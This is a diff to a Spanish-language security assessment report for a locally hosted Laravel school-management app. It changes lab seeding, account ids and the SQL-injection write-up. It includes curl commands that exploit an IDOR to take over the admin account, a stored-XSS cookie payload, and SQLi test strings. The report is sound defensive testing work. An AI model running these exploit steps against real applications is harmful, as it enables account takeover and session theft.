@@ -20,6 +20,17 @@ Todas las pruebas se ejecutaron contra la aplicación levantada localmente con D
 # (docker-compose.override.yml) que fuerza plataforma amd64 y crea el usuario de BD.
 docker compose up -d
 docker compose exec app php artisan migrate:fresh --seed --force   # crea admin@ut.com (id=1)
+
+# El seed solo crea el admin. Las cuentas de docente se crean por la MISMA vía que
+# usa la app (UserRepository::createTeacher), por lo que reciben EXACTAMENTE el
+# conjunto de permisos de un docente real: 'view users' pero NO 'edit users'.
+# Tras un seed limpio, Mallory queda id=2 (atacante) y Victor id=3 (objetivo del XSS).
+docker compose exec app php artisan tinker --execute '
+$rp = app(App\Repositories\UserRepository::class);
+$base = ["gender"=>"male","nationality"=>"NA","phone"=>"0","address"=>"x","address2"=>"","city"=>"x","zip"=>"0","password"=>"password123"];
+$rp->createTeacher($base + ["first_name"=>"Mallory","last_name"=>"Intruder","email"=>"mallory@ut.com"]);
+$rp->createTeacher($base + ["first_name"=>"Victor","last_name"=>"Victim","email"=>"victor@ut.com"]);
+'
 ```
 
 `docker-compose.override.yml` usado (solo entorno de laboratorio, no altera la lógica de la app):
@@ -38,7 +49,8 @@ services:
 | Cuenta | Rol | Permisos relevantes | Papel |
 |---|---|---|---|
 | `admin@ut.com` (id=1) | admin | `edit users`, `view users`, … | **Víctima** (seed) |
-| `mallory@ut.com` (id=3) | teacher | `view users` (**sin** `edit users`) | **Atacante** interno |
+| `mallory@ut.com` (id=2) | teacher | `view users` (**sin** `edit users`) | **Atacante** interno |
+| `victor@ut.com` (id=3) | teacher | `view users` (**sin** `edit users`) | **Objetivo** del XSS (PoC-UM-02) |
 
 Las cuentas atacante se crearon con exactamente los permisos que el propio código asigna a un docente en `UserRepository::createTeacher`, para que el escenario sea realista (un docente legítimo, de bajo privilegio).
 
@@ -51,7 +63,7 @@ Las cuentas atacante se crearon con exactamente los permisos que el propio códi
 | Marco | Referencia |
 |---|---|
 | OWASP Top 10 | **A01:2021 – Broken Access Control** (IDOR + falta de autorización a nivel de función) |
-| NIST CSF 2.0 | **PR.AC-04 / PR.AA-05** (menor privilegio y autorización); fallo de **PROTECT** |
+| NIST CSF 2.0 | **PR.AA-05** (autorización y menor privilegio); fallo de **PROTECT** |
 | Vector enunciado | Punto 1: *Escalación de privilegios & explotación de la confianza* |
 
 ### 1.2 Causa raíz (código)
@@ -79,8 +91,8 @@ T=$(curl -s -c "$CJ" "$B/login" | TOKEN)
 curl -s -b "$CJ" -c "$CJ" -o /dev/null \
   -d "_token=$T" --data-urlencode "email=mallory@ut.com" --data-urlencode "password=password123" "$B/login"
 
-# 2) Obtener un token CSRF válido de la sesión (desde el propio formulario de Mallory, id=3)
-ETOK=$(curl -s -b "$CJ" "$B/teachers/edit/3" | TOKEN)
+# 2) Obtener un token CSRF válido de la sesión (desde el propio formulario de Mallory, id=2)
+ETOK=$(curl -s -b "$CJ" "$B/teachers/edit/2" | TOKEN)
 
 # 3) EXPLOIT: editar al ADMIN (teacher_id=1) aunque es de otro rol y Mallory no tiene 'edit users'
 curl -s -b "$CJ" \
@@ -126,10 +138,10 @@ Un docente de bajo privilegio reescribió el perfil del administrador (incluido 
 Reutilizando el fallo de la PoC-UM-01, se inyectó un payload en `first_name` de un usuario y se observó cómo se renderiza.
 
 ```bash
-# Inyectar en el docente id=3 vía el endpoint vulnerable
+# Inyectar en el docente víctima Victor (id=3) vía el endpoint vulnerable
 curl -s -b "$CJ" -d "_token=$ETOK" -d "teacher_id=3" \
   --data-urlencode 'first_name=<script>alert(document.cookie)</script>' \
-  --data-urlencode "last_name=XSSprobe" --data-urlencode "email=mallory@ut.com" \
+  --data-urlencode "last_name=XSSprobe" --data-urlencode "email=victor@ut.com" \
   --data-urlencode "gender=female" --data-urlencode "nationality=CR" --data-urlencode "phone=1" \
   --data-urlencode "address=a" --data-urlencode "address2=b" --data-urlencode "city=c" --data-urlencode "zip=1" \
   "$B/school/teacher/update"
@@ -189,7 +201,8 @@ SELECT COUNT(*) FROM audit_logs WHERE event='model.updated';
 ```text
 Eventos presentes en audit_logs:
   model.created  User #1   (seed)
-  model.created  User #3   (alta de Mallory)
+  model.created  User #2   (alta de Mallory)
+  model.created  User #3   (alta de Victor)
   auth.login     mallory@ut.com
   ... pero NINGÚN model.updated para el User #1 pese a haberle cambiado email, nombre y updated_at.
 ```
@@ -252,13 +265,16 @@ SQL:      select * from `users` where `id` = ? limit 1
 BINDINGS: ["1 OR 1=1"]
 ```
 
-El payload completo viaja como **un único valor ligado** (`?`), nunca como parte del texto SQL. Resultados observados:
+**Evidencia principal:** el payload completo viaja como **un único valor ligado** (`?`), nunca como parte del texto SQL. Esta es la prueba determinante: aunque la cadena contenga `UNION`, `--` o `;`, PDO la trata como un literal, no como sintaxis SQL. Lo demás son observaciones de apoyo:
 
-- Ningún payload devolvió filas extra ni datos de otras tablas; `class_id` inválido produce un listado vacío.
 - La respuesta HTML **no** filtró errores de base de datos (`SQLSTATE`, *syntax error*): 0 ocurrencias.
 - Tras todos los intentos, `SELECT COUNT(*) FROM users` sigue devolviendo las mismas filas: la tabla está intacta.
 
-> Nota: `GET /students/view/profile/1` devuelve HTTP 500, pero **no es inyección**: el seed no tiene usuarios con `role='student'`, `findStudent` retorna `null` y la vista Blade desreferencia `null`. Es un fallo de robustez (manejo de nulos), ajeno a SQLi; se anota como mejora menor.
+> **Honestidad sobre el alcance del laboratorio.** El seed deja la base con **0** sesiones, clases, secciones y promociones. Por eso el listado sale vacío con *cualquier* valor de `class_id`: la ausencia de filas extra **no** es, por sí sola, prueba de que la inyección falla; la prueba está en los *bindings* de arriba. Para una verificación más fuerte convendría sembrar al menos una promoción y repetir los payloads, confirmando que siguen ligados.
+>
+> **Por qué el payload UNION devuelve 302 (no es una inyección exitosa).** En `getStudentList`, un `class_id` como `"0 UNION SELECT ..."` entra en una comparación débil de PHP 7.4: `"0 UNION..." == 0` es `true`, el código toma la rama de "clase por defecto", no encuentra ninguna (base vacía), lanza excepción y el controlador redirige (302). Es manejo de errores, no extracción de datos.
+>
+> **Nota aparte:** `GET /students/view/profile/1` devuelve HTTP 500, pero **tampoco es inyección**: el seed no tiene usuarios con `role='student'`, `findStudent` retorna `null` y la vista Blade desreferencia `null`. Fallo de robustez (manejo de nulos), ajeno a SQLi.
 
 ### 3bis.5 Conclusión honesta
 
@@ -270,7 +286,7 @@ La inyección SQL en el módulo de Gestión de Usuarios **no es explotable** en 
 
 | ID | Hallazgo | OWASP | NIST | Estado PoC |
 |---|---|---|---|---|
-| UM-01 | Broken Access Control / IDOR en update de usuarios → toma de cuenta | A01 | PR.AA/PR.AC | **Explotado** |
+| UM-01 | Broken Access Control / IDOR en update de usuarios → toma de cuenta | A01 | PR.AA-05 | **Explotado** |
 | UM-02 | XSS almacenado en perfil | A03 | PR.DS | Probado, **mitigado** por Blade (no explotable) |
 | UM-03a | Manipulación de parámetro HTTP (`teacher_id`/`student_id`) | A08 | DE.AE | **Explotado** |
 | UM-03b | Audit Poisoning / evasión (builder omite el observer) | A08/A09 | DE.CM | **Explotado** |
